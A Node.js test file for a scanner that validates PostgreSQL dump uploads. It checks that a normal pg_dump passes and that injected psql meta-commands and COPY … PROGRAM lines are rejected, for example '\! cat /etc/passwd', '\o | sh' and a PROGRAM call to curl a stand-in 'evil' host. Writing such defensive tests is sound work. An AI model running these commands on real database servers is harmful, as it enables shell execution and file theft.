const test = require('node:test');
const assert = require('node:assert/strict');
const { scanLines } = require('../backupScan');

const scan = text => scanLines(text.split('\n'));
const HEADER = '--\n-- PostgreSQL database dump\n--\n\\restrict AbC123xyz\nSET statement_timeout = 0;\n';
const FOOTER = '\\unrestrict AbC123xyz\n--\n-- PostgreSQL database dump complete\n--\n';

test('what pg_dump writes passes: COPY data (with backslashes), functions, strings', async () => {
  const dump = HEADER + [
    "CREATE FUNCTION public.app_now() RETURNS text LANGUAGE sql AS $$ SELECT to_char(now(), 'YYYY-MM-DD\\HH') $$;",
    "CREATE FUNCTION public.f() RETURNS void LANGUAGE plpgsql AS $_$",
    "BEGIN RAISE NOTICE 'a\\b'; END",
    "$_$;",
    "COMMENT ON TABLE public.tasks IS 'Tasks, incl. ''quoted'' text';",
    "SELECT pg_catalog.set_config('search_path', '', false);",
    "INSERT INTO public.x VALUES (E'line\\nbreak and \\' quote');",
    'COPY public."users" (id, name, notes) FROM stdin;',
    '1\tAlex\tC:\\\\path\\twith tabs \\! not a command',
    '2\tMaria\t\\N',
    '\\.',
    '/* a block',
    '   comment with \\ backslash */',
    'ALTER TABLE ONLY public.users ADD CONSTRAINT users_pkey PRIMARY KEY (id);',
  ].join('\n') + '\n' + FOOTER;
  assert.ok((await scan(dump)).lines > 10);
});

test('psql commands and COPY … PROGRAM are refused', async () => {
  for (const evil of [
    '\\! cat /etc/passwd',
    'SELECT 1; \\connect live_db',
    "\\copy x from program 'id'",
    '\\o | sh',
    "COPY public.x FROM PROGRAM 'curl http://evil';",
    "COPY (SELECT 1) TO\n  PROGRAM 'id';".replace('\n  ', ' '),
    'CREATE TABLE t (a int); \\gexec',
  ]) await assert.rejects(scan(HEADER + evil + '\n' + FOOTER), error => error.status === 400, evil);
  // A command hidden after a COPY block ends.
  await assert.rejects(scan(HEADER + 'COPY public.x (a) FROM stdin;\n1\n\\.\n\\! id\n' + FOOTER), /psql command/);
  await assert.rejects(scan('SELECT 1;\n'), /does not start like a PostgreSQL dump/);
  await assert.rejects(scan(HEADER + 'COPY public.x (a) FROM stdin;\n1\n'), /not finished/);
});
